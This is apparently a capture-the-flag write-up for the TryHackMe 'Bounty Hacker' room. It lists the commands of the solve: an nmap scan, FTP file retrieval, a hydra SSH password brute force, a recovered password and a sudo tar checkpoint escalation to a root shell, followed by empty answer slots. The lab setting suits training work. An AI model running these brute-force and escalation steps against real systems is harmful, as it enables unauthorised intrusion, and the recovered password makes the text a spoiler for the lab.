![Bounty Hacker](https://i.imgur.com/rCDF5u6.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/cowboyhacker/Bounty_Hacker_Cover.png" alt="Bounty Hacker Logo">
</p>

# Bounty Hacker

This guide contains the answer and steps necessary to get to them for the [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) room.

### Living up to the title.

Commands:

nmap -sV 10.10.216.171 
ftp 10.10.216.171
get task.txt
cat task.txt
get locks.txt
cat locks.txt
hydra -l user -P locks.txt ssh://10.10.216.171:22 -t 4  
hydra -l lin -P locks.txt ssh://10.10.216.171:22 -t 4
ssh lin@10.10.216.171 
cat user.txt
susudo

RedDr4gonSynd1cat3

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names


   
3. Who wrote the task list? 
   
   
   
   ><details><summary>Click for answer</summary></details>

4. What service can you bruteforce with the text file found?
   
   
   
   ><details><summary>Click for answer</summary></details>

5. What is the users password? 
   
   
   
   ><details><summary>Click for answer</summary></details>

6. user.txt

   
   
   ><details><summary>Click for answer</summary></details>
   
7. root.txt

   
   
   ><details><summary>Click for answer</summary></details>
